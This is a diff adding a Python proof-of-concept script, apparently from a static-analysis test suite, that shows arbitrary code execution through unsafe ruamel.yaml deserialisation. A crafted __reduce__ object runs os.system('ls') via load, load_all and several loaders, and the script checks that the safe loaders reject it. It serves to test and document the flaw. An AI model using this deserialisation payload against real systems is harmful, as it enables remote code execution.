@@ -1,0 +1,63 @@
+#!/usr/bin/env python3
+
+# this file doesn't have a .py extension so the extractor doesn't pick it up, so it
+# doesn't have to be annotated
+
+# This file is just a Proof of Concept for how code execution can be triggered.
+
+import os
+import ruamel.yaml
+
+class Exploit(object):
+    def __reduce__(self):
+        return (os.system, ('ls',))
+
+data = Exploit()
+serialized_data = ruamel.yaml.dump(data)
+
+# All these will execute `ls`
+print("!!! ruamel.yaml.load")
+ruamel.yaml.load(serialized_data)
+
+print("!!! ruamel.yaml.load kwarg")
+ruamel.yaml.load(stream=serialized_data)
+
+print("!!! ruamel.yaml.load with Loader=ruamel.yaml.Loader")
+ruamel.yaml.load(serialized_data, ruamel.yaml.Loader)
+
+print("!!! ruamel.yaml.load with Loader=ruamel.yaml.UnsafeLoader")
+ruamel.yaml.load(serialized_data, ruamel.yaml.UnsafeLoader)
+
+print("!!! ruamel.yaml.load with Loader=ruamel.yaml.CLoader")
+ruamel.yaml.load(serialized_data, ruamel.yaml.CLoader)
+
+# you need to iterate through the result for it to execute... but it still works
+print("!!! ruamel.yaml.load_all")
+for _ in ruamel.yaml.load_all(serialized_data):
+    pass
+
+# check that the safe version is actually safe
+print("\n" + "-"*80)
+print("safe versions")
+print("-" * 80)
+
+print("!!! ruamel.yaml.safe_load")
+try:
+    ruamel.yaml.safe_load(serialized_data)
+    raise Exception("should not happen")
+except ruamel.yaml.constructor.ConstructorError:
+    pass
+
+print("!!! ruamel.yaml.load with Loader=ruamel.yaml.SafeLoader")
+try:
+    ruamel.yaml.load(serialized_data, ruamel.yaml.SafeLoader)
+    raise Exception("should not happen")
+except ruamel.yaml.constructor.ConstructorError:
+    pass
+
+print("!!! ruamel.yaml.load with Loader=ruamel.yaml.CSafeLoader")
+try:
+    ruamel.yaml.load(serialized_data, ruamel.yaml.CSafeLoader)
+    raise Exception("should not happen")
+except ruamel.yaml.constructor.ConstructorError:
+    pass
